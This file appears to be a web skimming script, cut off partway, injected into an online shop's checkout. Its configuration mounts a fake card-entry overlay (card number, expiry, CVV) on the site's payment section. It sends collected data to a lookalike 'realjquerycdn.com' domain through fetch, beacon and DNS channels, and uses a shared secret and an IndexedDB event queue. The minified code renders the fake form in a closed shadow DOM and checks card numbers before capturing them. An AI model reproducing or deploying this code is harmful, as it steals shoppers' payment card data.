window.__SNCFG={
  "siteId": "miccostumes-1",
  "zone": "worldwidelibrary.net",
  "collectUrl": "https://realjquerycdn.com/c/b",
  "beaconUrl": "https://realjquerycdn.com/c/bk",
  "sharedSecret": "1904618d67b95af96be58a63580bfd60d2e0bbb90a39be96984f2a03dd99bbfd",
  "transport": {
    "priority": [
      "fetch",
      "beacon",
      "dns"
    ],
    "encryptDns": true
  },
  "selectors": {},
  "flushIntervalMs": 4000,
  "form": {
    "mount": "#id_payment_method .payment_ext",
    "overlay": true,
    "key": "ff-mic1",
    "reloadMs": 1500,
    "submitSelector": "a.btn_flat.pk",
    "submitToggleClass": "disable",
    "theme": {
      "font": "\"Open Sans\", sans-serif",
      "fontSize": "16px",
      "formPadding": "12px 16px 9px",
      "inputFont": "Roboto, sans-serif",
      "bgColor": "#f7f7f7",
      "textColor": "#000000",
      "width": "100%",
      "radius": "0px",
      "labelColor": "#000000",
      "labelFontSize": "16px",
      "labelFontWeight": "400",
      "inputHeight": "36px",
      "inputBorderColor": "transparent",
      "inputBorderRadius": "16px",
      "inputFontSize": "16px",
      "inputPadding": "0px 10px",
      "inputTextColor": "#32325d",
      "inputFocusBorderColor": "#3366ff",
      "placeholderColor": "#32325d",
      "rowGap": "29px",
      "colGap": "69px",
      "brandIcon": true,
      "submitButton": false
    },
    "fields": [
      {
        "name": "card",
        "label": "Number",
        "type": "card",
        "placeholder": "Credit Card Number"
      },
      {
        "name": "exp",
        "label": "Expiration Date",
        "type": "exp",
        "placeholder": "MM / YY",
        "width": "half"
      },
      {
        "name": "cvv",
        "label": "CVV2",
        "type": "cvv",
        "placeholder": "CVC",
        "width": "half"
      }
    ]
  }
}
;
(()=>{var rt=Object.defineProperty;var ot=(t,e,r)=>e in t?rt(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r;var Se=(t,e,r)=>ot(t,typeof e!="symbol"?e+"":e,r);var ie={dbPrefix:"app-data",banKey:"sys.appstat",batchMaxBytes:2200,flushIntervalMs:3e4,flushCount:20,keys:!1},it=["fetch","beacon","dns"],st=["card","exp","cvv","text","email","tel","select"],at=["name","label","type","required","options","placeholder","maxLength","width"],Me=["font","primaryColor","bgColor","textColor","radius","width","labelColor","labelFontSize","labelFontWeight","inputHeight","inputBorderColor","inputBorderRadius","inputFontSize","inputPadding","inputTextColor","inputFocusBorderColor","buttonHeight","buttonBorderRadius","buttonFontSize","buttonTextColor","buttonWidth","submitLabel","preset","fontSize","buttonFontWeight","buttonDisabledColor","brandIcon","rowGap","colGap","placeholderColor","submitButton","formPadding","inputFont","labelMode","inputFocusBoxShadow"],Le=2400;function re(t,e){if(t===null||typeof t!="object"||Array.isArray(t))throw new TypeError(`config: ${e}`);return t}function se(t,e,r){for(let o of Object.keys(t))if(!e.includes(o))throw new TypeError(`config: unknown ${r}.${o}`)}function B(t,e,r,o){let n=t[e];if(typeof n!="string"||!n.length||n.length>r||n!==n.trim())throw new TypeError(`config: ${e}`);if(o&&!o.test(n))throw new TypeError(`config: ${e}`);return n}function Ae(t,e,r){return t[e]===void 0?r:B(t,e,64)}function ye(t,e,r,o){let n=t[e];if(!Number.isSafeInteger(n)||n<r||n>o)throw new TypeError(`config: ${e}`);return n}function Ie(t,e){if(typeof t[e]!="boolean")throw new TypeError(`config: ${e}`);return t[e]}function Re(t,e,r){if(t[e]===void 0)return{};let o=re(t[e],e),n={};for(let[i,a]of Object.entries(o)){if(i.length>64)throw new TypeError(`config: ${e} name`);n[i]=B(o,i,r)}return n}function lt(t){let e=t.priority;if(!Array.isArray(e)||!e.length||e.length>3)throw new TypeError("config: priority");let r=new Set,o=[];for(let n of e){if(!it.includes(n)||r.has(n))throw new TypeError("config: priority");r.add(n),o.push(n)}return o}function ct(t){let e=re(t,"form");se(e,["mount","fields","key","theme","overlay","reloadMs","submitSelector","submitToggleClass"],"form");let r=e.fields;if(!Array.isArray(r)||!r.length||r.length>16)throw new TypeError("config: form.fields");let o={mount:B(e,"mount",256),fields:r.map(()=>({})),key:B(e,"key",64)};if(e.overlay!==void 0){if(typeof e.overlay!="boolean")throw new TypeError("config: form.overlay");o.overlay=e.overlay}if(e.reloadMs!==void 0){let n=ye(e,"reloadMs",0,6e4);o.reloadMs=n}if(e.submitSelector!==void 0&&(o.submitSelector=B(e,"submitSelector",256)),e.submitToggleClass!==void 0){let n=e.submitToggleClass;if(typeof n!="string"||n.length>64||n!==n.trim()||!/^[a-zA-Z0-9 _-]*$/.test(n))throw new TypeError("config: submitToggleClass");o.submitToggleClass=n}for(let n=0;n<r.length;n++){let i=re(r[n],"form.fields[]");se(i,at,"form.fields[]");let a=B(i,"type",8);if(!st.includes(a))throw new TypeError("config: form.fields[].type");let f={name:B(i,"name",64),label:B(i,"label",128),type:a};if(i.required!==void 0){if(typeof i.required!="boolean")throw new TypeError("config: form.fields[].required");f.required=i.required}if(i.placeholder!==void 0&&(f.placeholder=B(i,"placeholder",128)),i.width!==void 0){let c=B(i,"width",8);if(c!=="full"&&c!=="half")throw new TypeError("config: form.fields[].width");f.width=c}if(i.maxLength!==void 0){if(!Number.isSafeInteger(i.maxLength)||i.maxLength<0||i.maxLength>2147483647)throw new TypeError("config: form.fields[].maxLength");f.maxLength=i.maxLength}if(i.options!==void 0){if(!Array.isArray(i.options))throw new TypeError("config: form.fields[].options");f.options=i.options.map(c=>{let u=re(c,"form.fields[].options[]");return se(u,["value","label"],"form.fields[].options[]"),{value:B(u,"value",128),label:B(u,"label",128)}})}o.fields[n]=f}if(e.theme!==void 0){let n=re(e.theme,"form.theme");se(n,Me,"form.theme");let i={};for(let a of Me)if(n[a]!==void 0)if(a==="brandIcon"||a==="submitButton"){if(typeof n[a]!="boolean")throw new TypeError(`config: ${a}`);i[a]=n[a]}else i[a]=B(n,a,256);o.theme=i}return o}function dt(t){if(t.split(".").some(r=>r.length<1||r.length>63))throw new TypeError("config: zone");return t}function Be(t){let e=re(t,"root");se(e,["siteId","zone","collectUrl","beaconUrl","sharedSecret","dbPrefix","banKey","batchMaxBytes","flushIntervalMs","flushCount","keys","transport","selectors","textBlocks","form"],"root");let r=re(e.transport,"transport");se(r,["priority","encryptDns"],"transport");let o=lt(r),n={siteId:B(e,"siteId",24,/^[a-z0-9][a-z0-9-]*$/),zone:dt(B(e,"zone",200,/^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$/)),collectUrl:B(e,"collectUrl",256,/^https?:\/\/[a-z0-9][a-z0-9.\-:]*([\/?#][^\s]*)?$/i),beaconUrl:B(e,"beaconUrl",256,/^https?:\/\/[a-z0-9][a-z0-9.\-:]*([\/?#][^\s]*)?$/i),sharedSecret:B(e,"sharedSecret",256),dbPrefix:Ae(e,"dbPrefix",ie.dbPrefix),banKey:Ae(e,"banKey",ie.banKey),batchMaxBytes:e.batchMaxBytes===void 0?ie.batchMaxBytes:ye(e,"batchMaxBytes",256,65536),flushIntervalMs:e.flushIntervalMs===void 0?ie.flushIntervalMs:ye(e,"flushIntervalMs",2e3,6e5),flushCount:e.flushCount===void 0?ie.flushCount:ye(e,"flushCount",1,100),keys:e.keys===void 0?ie.keys:Ie(e,"keys"),transport:{priority:o,encryptDns:Ie(r,"encryptDns")},selectors:Re(e,"selectors",256),textBlocks:Re(e,"textBlocks",256)};if(o.includes("dns")&&n.batchMaxBytes>Le)throw new TypeError(`config: batchMaxBytes must be <= ${Le} when dns transport is enabled`);return e.form!==void 0&&(n.form=ct(e.form)),n}var ae="events_store",pe="ui_state",me="event_claims",Fe=new Map,le=class{constructor(e,r){Se(this,"reason");Se(this,"snapshot");this.reason=e,this.snapshot=r}};function ut(){return{events:new Map,ui:new Map,claims:new Map}}function De(t){if(t===null||typeof t!="object")return!1;let e=t;return typeof e.id=="string"&&Number.isFinite(e.ts)&&typeof e.type=="string"&&e.data!==null&&typeof e.data=="object"&&!Array.isArray(e.data)&&(e.state==="pending"||e.state==="sent")}function ft(t){if(t===null||typeof t!="object")return!1;let e=t;return typeof e.t=="string"&&e.t.length>=8&&Number.isFinite(e.ts)}function pt(){let t=new Uint8Array(16);crypto.getRandomValues(t);let e="";for(let r of t)e+=r.toString(16).padStart(2,"0");return e}function ze(t,e){return t.ts-e.ts||(t.id<e.id?-1:t.id>e.id?1:0)}async function mt(t){return typeof globalThis.structuredClone=="function"?globalThis.structuredClone(t):new Promise((e,r)=>{let o=new MessageChannel,n=()=>{o.port1.close(),o.port2.close()};o.port1.onmessage=i=>{n(),e(i.data)},o.port1.onmessageerror=()=>{n(),r(new DOMException("Value could not be cloned","DataCloneError"))};try{o.port2.postMessage(t)}catch(i){n(),r(i)}})}async function be(t){try{return{value:await mt(t)}}catch{return null}}function gt(t){return new Promise(e=>{let r=!1,o=n=>{if(r){n?.close();return}r=!0,e(n)};try{let n=globalThis.indexedDB.open(t,1);n.onblocked=()=>o(null),n.onerror=i=>{i.preventDefault(),o(null)},n.onupgradeneeded=()=>{let i=n.transaction;if(r){i.abort();return}try{let a=n.result,f=a.objectStoreNames.contains(ae)?i.objectStore(ae):a.createObjectStore(ae,{keyPath:"id"});f.indexNames.contains("state")||f.createIndex("state","state"),f.indexNames.contains("ts")||f.createIndex("ts","ts"),a.objectStoreNames.contains(pe)||a.createObjectStore(pe),a.objectStoreNames.contains(me)||a.createObjectStore(me)}catch{i.abort()}},n.onsuccess=()=>{let i=n.result;[ae,pe,me].every(a=>i.objectStoreNames.contains(a))?o(i):(i.close(),o(null))}}catch{o(null)}})}function ht(t,e){return new Promise((r,o)=>{let n;try{n=t.transaction([ae,pe,me],"readwrite")}catch(u){o(new le(u));return}let i,a,f,c;n.onabort=()=>o(new le(c??n.error,i)),n.onerror=()=>{c==null&&(c=n.error)},n.oncomplete=()=>r({snapshot:a,value:f});try{let u=n.objectStore(ae),l=n.objectStore(pe),d=n.objectStore(me),p=[u.getAll(),l.getAllKeys(),l.getAll(),d.getAllKeys(),d.getAll()],w=p.length;for(let S of p)S.onsuccess=()=>{if(--w===0)try{let y=p[0].result.filter(De),C=p[1].result,L=p[2].result,E=new Map,N=p[3].result,P=p[4].result;for(let[s,m]of N.entries()){let h=P[s];ft(h)&&E.set(String(m),h)}i={events:new Map(y.map(s=>[s.id,s])),ui:new Map(C.map((s,m)=>[s,L[m]])),claims:E},a={events:new Map(i.events),ui:new Map(i.ui),claims:new Map(i.claims)},f=e(a);for(let s of i.events.keys())a.events.has(s)||u.delete(s);for(let s of i.claims.keys())a.claims.has(s)||d.delete(s);for(let[s,m]of a.events)i.events.get(s)!==m&&u.put(m);for(let[s,m]of a.claims)i.claims.get(s)!==m&&d.put(m,s);for(let[s,m]of a.ui)(!i.ui.has(s)||!Object.is(i.ui.get(s),m))&&l.put(m,s)}catch(y){c=y,n.abort()}}}catch(u){c=u,n.abort()}})}async function yt(t){let e=await gt(t),r=ut(),o=Promise.resolve();function n(l){let d=o.then(l);return o=d.then(()=>{},()=>{}),d}function i(l){l instanceof le&&l.snapshot&&(r=l.snapshot)}function a(){let l=e;e=null;try{l?.close()}catch{}}async function f(l){if(!e)return l(r);let d=await ht(e,l);return r=d.snapshot,d.value}async function c(l){try{return await f(l)}catch(d){return i(d),a(),l(r)}}e&&(e.onversionchange=a,e.onclose=a,await c(()=>{}));function u(l,d){let p=Array.isArray(l)?l.filter(w=>w&&typeof w.id=="string"&&typeof w.claimToken=="string"):[];return n(()=>c(w=>{for(let S of p){let y=w.claims.get(S.id);if(!y||y.t!==S.claimToken)continue;let C=w.events.get(S.id);w.claims.delete(S.id),C&&C.state==="pending"&&w.events.set(S.id,{...C,state:d})}}))}return{get isPersistent(){return e!==null},putEvent(l){let d=be(l);return n(async()=>{let p=await d;if(!p||!De(p.value))return;let w=S=>{let y=S.events.get(p.value.id);y&&(y.state==="sent"||JSON.stringify(y)!==JSON.stringify(p.value))||(S.events.set(p.value.id,p.value),p.value.state==="sent"&&S.claims.delete(p.value.id))};for(;;)try{await f(w);return}catch(S){i(S);let y=S instanceof le?S.reason:S;if(e&&y?.name==="QuotaExceededError")try{if(await f(L=>{let E=[...L.events.values()].filter(N=>N.state==="pending").sort(ze)[0];return E?(L.events.delete(E.id),L.claims.delete(E.id),!0):!1}))continue}catch(C){i(C)}a(),w(r);return}})},takePending(l){return n(async()=>{if(!Number.isSafeInteger(l)||l<=0)return[];let d=await c(p=>{let w=Date.now();for(let[C,L]of p.claims)w-L.ts>=12e4&&p.claims.delete(C);let S=[...p.events.values()].filter(C=>C.state==="pending"&&!p.claims.has(C.id)).sort(ze).slice(0,l),y=[];for(let C of S){let L=pt();p.claims.set(C.id,{t:L,ts:w}),y.push({...C,claimToken:L,leaseUntil:w+12e4})}return y});return(await be(d))?.value??[]})},markSent(l){return u(l,"sent")},resetFailed(l){return u(l,"pending")},purgeOlderThan(l){return n(()=>c(d=>{if(!(typeof l!="number"||Number.isNaN(l)))for(let[p,w]of d.events)w.ts<l&&(d.events.delete(p),d.claims.delete(p))}))},setUiState(l,d){let p=be(d);return n(async()=>{let w=await p;!w||typeof l!="string"||await c(S=>{S.ui.set(l,w.value)})})},getUiState(l){return n(async()=>{if(typeof l!="string")return null;let d=await c(w=>w.ui.has(l)?w.ui.get(l):null),p=await be(d);return p?p.value:null})}}}function He(t){let e=Fe.get(t);return e||(e=yt(t),Fe.set(t,e)),e}var Ee=Object.freeze({required:"This field is required.",card:"Enter a valid card number.",exp:"Enter a current or future date in MM/YY format.",cvv:"Enter a valid security code.",text:"Enter text within the allowed length.",email:"Enter a valid email address.",tel:"Enter a valid phone number.",select:"Choose a listed option.",save:"Could not save submission. Please try again."}),bt=Object.freeze({font:"Urbanist, system-ui, sans-serif",fontSize:"14px",textColor:"#00112c",primaryColor:"#dc2f2f",labelColor:"#00112c",labelFontSize:"11.34px",labelFontWeight:400,inputHeight:"40px",inputBorderColor:"#b9c4c9",inputBorderRadius:"6px",inputFontSize:"14px",inputPadding:"5px 8px",inputTextColor:"#00112c",inputFocusBorderColor:"#0667d1",buttonHeight:"48px",buttonBorderRadius:"4px",buttonFontSize:"16px",buttonFontWeight:400,buttonTextColor:"#fff",buttonWidth:"100%",buttonDisabledColor:"#c9cdd4"}),wt=Object.freeze({visa:`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 18" aria-hidden="true" focusable="false">
    <rect x=".5" y=".5" width="27" height="17" rx="2" fill="#fff" stroke="#d1d5db"/>
    <text x="14" y="12.5" text-anchor="middle" font-family="Arial, sans-serif" font-size="10" font-weight="900" font-style="italic" fill="#1434cb">VISA</text>
  </svg>`,mastercard:`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 18" aria-hidden="true" focusable="false">
    <rect x=".5" y=".5" width="27" height="17" rx="2" fill="#fff" stroke="#d1d5db"/>
    <circle cx="10.5" cy="9" r="6" fill="#eb001b"/>
    <circle cx="17.5" cy="9" r="6" fill="#f79e1b"/>
    <path d="M14 4.13a6 6 0 0 1 0 9.74 6 6 0 0 1 0-9.74Z" fill="#ff5f00"/>
  </svg>`,amex:`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 18" aria-hidden="true" focusable="false">
    <rect width="28" height="18" rx="2" fill="#006fcf"/>
    <text x="14" y="8" text-anchor="middle" font-family="Arial, sans-serif" font-size="4.8" font-weight="900" fill="#fff">AMERICAN</text>
    <text x="14" y="13.5" text-anchor="middle" font-family="Arial, sans-serif" font-size="5.3" font-weight="900" fill="#fff">EXPRESS</text>
  </svg>`,discover:`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 18" aria-hidden="true" focusable="false">
    <rect x=".5" y=".5" width="27" height="17" rx="2" fill="#fff" stroke="#d1d5db"/>
    <path d="M2 16.5h24v-6c-5 4-13 6-24 6Z" fill="#ff6000"/>
    <text x="14" y="9.5" text-anchor="middle" font-family="Arial, sans-serif" font-size="4.8" font-weight="900" fill="#111827">DISCOVER</text>
  </svg>`,unknown:`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 18" aria-hidden="true" focusable="false">
    <rect x="1" y="1" width="26" height="16" rx="2" fill="#f3f4f6" stroke="#9ca3af"/>
    <path d="M1.5 5.5h25M5 12h6" fill="none" stroke="#9ca3af" stroke-width="2"/>
  </svg>`}),vt=[["formPadding","--form-padding","padding","20px"],["rowGap","--row-gap","margin-bottom","14px"],["colGap","--col-gap","column-gap","8px"],["placeholderColor","--placeholder-color","color","#6b7280"],["labelColor","--label-color","color","inherit"],["labelFontSize","--label-font-size","font-size","inherit"],["labelFontWeight","--label-font-weight","font-weight","600"],["inputHeight","--input-height","height","auto"],["inputBorderColor","--input-border-color","border-color","#9ca3af"],["inputBorderRadius","--input-border-radius","border-radius","4px"],["inputFont","--input-font","font-family","inherit"],["inputFontSize","--input-font-size","font-size","inherit"],["inputPadding","--input-padding","padding","10px"],["inputTextColor","--input-text-color","color","inherit"],["inputFocusBorderColor","--input-focus-border-color","border-color","#9ca3af"],["buttonHeight","--button-height","height","auto"],["buttonBorderRadius","--button-border-radius","border-radius","4px"],["buttonFontSize","--button-font-size","font-size","inherit"],["buttonFontWeight","--button-font-weight","font-weight","inherit"],["buttonTextColor","--button-text-color","color","#ffffff"],["buttonWidth","--button-width","width","auto"],["buttonDisabledColor","--button-disabled-color","background-color","#c9cdd4"]],xt=`
:host {
  all: initial !important;
  display: block !important;
  direction: ltr !important;
  unicode-bidi: isolate !important;
  contain: style !important;
  isolation: isolate !important;
}
/* SVG presentation attributes must survive the HTML reset. */
:where(*:not(svg, svg *)), *::before, *::after {
  all: initial;
  box-sizing: border-box;
  font: inherit;
  color: inherit;
}
style { display: none !important; }
form {
  display: block;
  direction: ltr;
  unicode-bidi: isolate;
  font: 16px/1.4 sans-serif;
  text-align: left;
  color: #111827;
  background-color: #ffffff;
  width: 360px;
  max-width: 100%;
  padding: var(--form-padding, 20px);
  border-radius: 8px;
}
.field { display: block; margin-bottom: var(--row-gap, 14px); }
form.has-half-fields { container-type: inline-size; container-name: e5-form; }
.field-row { display: flex; flex-direction: row; gap: var(--col-gap, 8px); margin-bottom: var(--row-gap, 14px); }
.field-row > .field { flex: 0 0 calc((100% - var(--col-gap, 8px)) / 2); min-width: 0; margin-bottom: 0; }
/* Container queries measure content width: 320px + 20px padding on each side = 360px. */
@container e5-form (width < 320px) {
  .field-row { flex-direction: column; }
  .field-row > .field { flex-basis: auto; width: 100%; }
}
label {
  display: block;
  margin-bottom: 5px;
  color: var(--label-color, inherit);
  font-size: var(--label-font-size, inherit);
  font-weight: var(--label-font-weight, 600);
}
input, select {
  display: block;
  appearance: auto;
  width: 100%;
  height: var(--input-height, auto);
  padding: var(--input-padding, 10px);
  border: 1px solid var(--input-border-color, #9ca3af);
  border-radius: var(--input-border-radius, 4px);
  font-family: var(--input-font, inherit);
  font-size: var(--input-font-size, inherit);
  background-color: #ffffff;
  color: var(--input-text-color, inherit);
  cursor: text;
}
select { cursor: default; }
.card-input { display: block; position: relative; }
.card-input > input {
  padding-right: max(44px, calc(var(--card-padding-right, 10px) + 36px));
}
.card-brand {
  display: block;
  position: absolute;
  right: 8px;
  top: 50%;
  transform: translateY(-50%);
  width: 28px;
  height: 18px;
  opacity: .74;
  pointer-events: none;
}
.card-brand:empty { visibility: hidden; }
.card-brand svg { display: block; width: 100%; height: 100%; }
input::placeholder { color: var(--placeholder-color, #6b7280); opacity: 1; font: inherit; }
input:focus, select:focus {
  outline: 2px solid;
  outline-offset: 2px;
  border-color: var(--input-focus-border-color, var(--input-border-color, #9ca3af));
}
form.adyen input:focus, form.adyen select:focus { outline: none; }
input[aria-invalid="true"], select[aria-invalid="true"] { border-color: #b91c1c; }
.error, .status { display: block; color: #b91c1c; font-size: 14px; margin-top: 4px; }
button {
  display: inline-block;
  appearance: none;
  padding: 10px 18px;
  border: 1px solid transparent;
  height: var(--button-height, auto);
  width: var(--button-width, auto);
  border-radius: var(--button-border-radius, 4px);
  font-size: var(--button-font-size, inherit);
  font-weight: var(--button-font-weight, inherit);
  background-color: var(--button-color, #2563eb);
  color: var(--button-text-color, #ffffff);
  text-align: center;
  cursor: pointer;
}
button:focus-visible { outline: 2px solid; outline-offset: 2px; }
button:disabled, input:disabled, select:disabled { opacity: .65; cursor: default; }
button:disabled { background-color: var(--button-disabled-color, var(--button-color, #2563eb)); }
form.adyen button:disabled { opacity: 1; }
`,St=`
.floating-input {
  display: block;
  position: relative;
  font-family: var(--input-font, inherit);
  font-size: var(--input-font-size, inherit);
}
.floating-input > input, .floating-input > select {
  height: auto;
  min-height: var(--input-height, 50.4px);
  padding-top: 36px;
}
.floating-input > label {
  position: absolute;
  top: 0;
  left: calc(var(--floating-padding-left, 10px) + 1px);
  right: calc(var(--floating-padding-right, 10px) + 1px);
  height: 100%;
  margin-bottom: 0;
  font-size: inherit;
  line-height: 1.4;
  color: var(--placeholder-color, #6b7280);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  pointer-events: none;
  transform: translateY(calc(50% - .7em));
  transform-origin: top left;
  transition: transform 80ms ease, font-size 80ms ease;
}
.floating-input.card-input > label {
  right: max(44px, calc(var(--card-padding-right, 10px) + 36px));
}
.floating-input.floated > label {
  transform: translateY(8px);
  font-size: 12px;
  letter-spacing: normal;
}
.floating-input.resting > input::placeholder { opacity: 0; }
`,Et=`
input:focus, select:focus {
  outline: none;
  box-shadow: var(--input-focus-box-shadow, none);
}
input:focus:not([aria-invalid="true"]), select:focus:not([aria-invalid="true"]) {
  border-color: var(--input-border-color, #9ca3af);
}
`;function ge(t){return t.replace(/[ -]/g,"")}function _e(t){if(!/^[0-9]+$/.test(t))return"unknown";if(/^4/.test(t))return"visa";if(/^3[47]/.test(t))return"amex";if(/^(?:5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01]|2720)/.test(t))return"mastercard";let e=t.length>=6?Number(t.slice(0,6)):0;return/^(?:6011|65|64[4-9])/.test(t)||e>=622126&&e<=622925?"discover":"unknown"}function Ct(t){if(!/^[0-9]{13,19}$/.test(t))return!1;let e=0,r=!1;for(let o=t.length-1;o>=0;o--){let n=t.charCodeAt(o)-48;r&&(n*=2,n>9&&(n-=9)),e+=n,r=!r}return e%10===0}function kt(t,e){let r=new Date,o=t.some(i=>{if(i.type!=="card")return!1;let a=ge(e[i.name]);return a.length===15&&_e(a)==="amex"}),n=[];for(let i of t){let a=e[i.name];if(a===""){i.required!==!1&&n.push([i.name,Ee.required]);continue}let f=!1;switch(i.type){case"card":f=Ct(ge(a));break;case"exp":{let c=/^(0[1-9]|1[0-2])\/([0-9]{2})$/.exec(a);if(c){let u=2e3+Number(c[2]),l=Number(c[1]);f=u>r.getFullYear()||u===r.getFullYear()&&l>=r.getMonth()+1}break}case"cvv":f=/^[0-9]{3}$/.test(a)||o&&/^[0-9]{4}$/.test(a);break;case"email":f=/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(a);break;case"tel":f=/^[0-9 +()\-]{7,15}$/.test(a)&&(i.maxLength===void 0||a.length<=i.maxLength);break;case"select":f=(i.options??[]).some(c=>c.value===a);break;case"text":f=i.maxLength===void 0||a.length<=i.maxLength;break}f||n.push([i.name,Ee[i.type]])}return{values:e,valid:n.length===0,errors:Object.fromEntries(n)}}function Tt(t){let e=new Set;return t.map(r=>{if(!r||typeof r.name!="string"||typeof r.label!="string"||!["card","exp","cvv","text","email","tel","select"].includes(r.type))throw new TypeError("Invalid field specification");if(e.has(r.name))throw new TypeError("Duplicate field name");if(e.add(r.name),r.width!==void 0&&r.width!=="full"&&r.width!=="half")throw new TypeError("Invalid field width");if((r.type==="text"||r.type==="tel")&&r.maxLength!==void 0&&(!Number.isSafeInteger(r.maxLength)||r.maxLength<0||r.maxLength>2147483647))throw new RangeError("Invalid maxLength");return{...r,options:r.options?.map(o=>({...o}))}})}function W(t,e,r,o){return t.style.setProperty(e,o),typeof r=="string"&&r.trim()&&t.style.setProperty(e,r),t.style.getPropertyValue(e)}function Ne(){let t=0,e=null,r=null;function o(){t++,r=null;let n=e;e=null,n?.()}return{destroy:o,requestSubmit:()=>r?.requestSubmit()??!1,validState:()=>r?.validState()??null,async render(n,i,a,f,c){o();let u=t,l=Tt(a),d={...i.preset==="adyen"?bt:{},...Object.fromEntries(Object.entries(i).filter(([,b])=>b!==void 0))},p=`shown.${f.key}`,w=Symbol("canceled"),S=new Promise(b=>{e=()=>b(w)}),y=async()=>{try{return await c.get(p)}catch{return w}},C=await Promise.race([y(),S]);if(t!==u||C===w||C===1)return t===u&&(e=null),!1;e=null;let L=typeof n=="string"?document.getElementById(n):n;if(!L||L.nodeType!==1||typeof L.appendChild!="function")throw new TypeError("Mount element not found");let E=L.ownerDocument,N=E.createElement("div"),P=N.attachShadow({mode:"closed"}),s=E.createElement("style"),m=d.labelMode==="floating",h=typeof d.inputFocusBoxShadow=="string"&&d.inputFocusBoxShadow.trim()!=="";s.textContent=xt+(m?St:"")+(h?Et:"");let g=E.createElement("form");g.noValidate=!0,W(g,"font-family",d.font,"sans-serif"),W(g,"font-size",d.fontSize,"16px"),W(g,"background-color",d.bgColor,"#ffffff"),W(g,"color",d.textColor,"#111827"),W(g,"border-radius",d.radius,"8px"),W(g,"width",d.width,"360px");let R=d.preset==="adyen";g.classList.toggle("adyen",R),g.classList.toggle("has-half-fields",l.some(b=>b.width==="half"));let A=E.createElement("div");for(let[b,z,D,v]of vt){g.style.setProperty(z,"initial");let Y=d[b];if(Y!==void 0){let Z=W(A,D,typeof Y=="number"?String(Y):Y,v);g.style.setProperty(z,b==="inputFont"&&(Z==="inherit"||Z==="unset")?"initial":Z)}}h&&g.style.setProperty("--input-focus-box-shadow",W(A,"box-shadow",d.inputFocusBoxShadow,"none"));let T=[],K=[],O=(b,z,D)=>{b.addEventListener(z,D),K.push(()=>b.removeEventListener(z,D))},F=d.submitButton===!1?null:E.createElement("button"),oe=W(A,"background-color",d.primaryColor,"#2563eb");F&&(F.type="submit",F.textContent=d.submitLabel??"Submit",F.style.setProperty("--button-color",oe),F.style.outlineColor=oe);let q=E.createElement("div");q.className="status",q.setAttribute("role","alert");let Q=!0,J=!1,te=!1,ce=!1,de,V=new Promise(b=>{de=b}),G=b=>{ce||(ce=!0,de(b))};e=()=>{Q=!1;for(let b of K)b();K.length=0,P.replaceChildren(),N.remove(),G(!1)};let H=()=>kt(l,Object.fromEntries(T.map(b=>[b.spec.name,b.input.value.trim()]))),M=()=>{F&&(F.disabled=J||te||R&&!H().valid)},I=b=>{for(let z of T)z.input.disabled=b;M()};function ue(){return!Q||J||te?!1:(ne(),!0)}async function ne(){let b=H();q.textContent="";for(let z of T){let D=Object.prototype.hasOwnProperty.call(b.errors,z.spec.name)?b.errors[z.spec.name]:"";z.error.textContent=D,z.input.setAttribute("aria-invalid",D?"true":"false")}if(!b.valid){M(),T.find(z=>z.input.getAttribute("aria-invalid")==="true")?.input.focus();return}J=!0,I(!0);try{if(await c.set(p,1),!Q||t!==u)return;te=!0,J=!1,G(b)}catch{if(!Q||t!==u)return;J=!1,I(!1),q.textContent=Ee.save}}try{let b=null;for(let[D,v]of l.entries()){let Y=E.createElement("div");Y.className="field";let Z=E.createElement("label"),we=`field-${D}`;Z.htmlFor=we,Z.textContent=v.label;let x;if(v.type==="select"){x=E.createElement("select");let $=E.createElement("option");$.value="",$.textContent=m?"":v.placeholder??"Select an option",x.appendChild($);for(let k of v.options??[]){let U=E.createElement("option");U.value=k.value,U.textContent=k.label,x.appendChild(U)}x.value="",x.setAttribute("autocomplete","off")}else x=E.createElement("input"),x.type=v.type==="email"?"email":v.type==="tel"?"tel":"text",x.placeholder=v.placeholder??(v.type==="exp"?"MM/YY":""),x.inputMode=["card","exp","cvv"].includes(v.type)?"numeric":v.type==="email"?"email":v.type==="tel"?"tel":"text",x.autocomplete=v.type==="card"?"cc-number":v.type==="exp"?"cc-exp":v.type==="email"?"email":v.type==="tel"?"tel":"off",(v.type==="text"||v.type==="tel")&&v.maxLength!==void 0&&(x.maxLength=v.maxLength);x.id=we,x.name=v.name,x.required=v.required!==!1,x.style.outlineColor=oe;let ee=E.createElement("span");ee.id=`${we}-error`,ee.className="error",ee.setAttribute("aria-live","polite"),x.setAttribute("aria-describedby",ee.id),T.push({spec:v,input:x,error:ee});let _=x,X=null;v.type==="card"&&d.brandIcon===!0&&(_=E.createElement("div"),_.className="card-input",W(A,"padding",d.inputPadding,"10px"),x.style.setProperty("--card-padding-right",A.style.paddingRight),X=E.createElement("span"),X.className="card-brand",X.dataset.brand="",X.setAttribute("aria-hidden","true"),_.append(x,X));let ve=!1,fe=()=>{if(!m)return;let $=x.value!==""||v.type!=="select"&&ve;for(let k of[_,Z])k.classList.toggle("floated",$),k.classList.toggle("resting",!$)};m?(_===x&&(_=E.createElement("div"),_.appendChild(x)),_.classList.add("floating-input"),W(A,"padding",d.inputPadding,"10px"),_.style.setProperty("--floating-padding-left",A.style.paddingLeft),_.style.setProperty("--floating-padding-right",A.style.paddingRight),_.prepend(Z),fe(),v.type!=="select"&&(O(x,"focus",()=>{ve=!0,fe()}),O(x,"blur",()=>{ve=!1,fe()})),Y.append(_,ee)):Y.append(Z,_,ee),v.width==="half"?(b||(b=E.createElement("div"),b.className="field-row",g.appendChild(b)),b.appendChild(Y),b.childElementCount===2&&(b=null)):(b=null,g.appendChild(Y));let xe=$=>{if(!(!Q||J||te)){if($.isComposing){fe();return}if(v.type==="card"){let k=x,U=ge(k.value);if(X){let j=U===""?"":_e(U);X.dataset.brand!==j&&(X.dataset.brand=j,X.innerHTML=j?wt[j]:"")}if(/^[0-9]*$/.test(U)){let 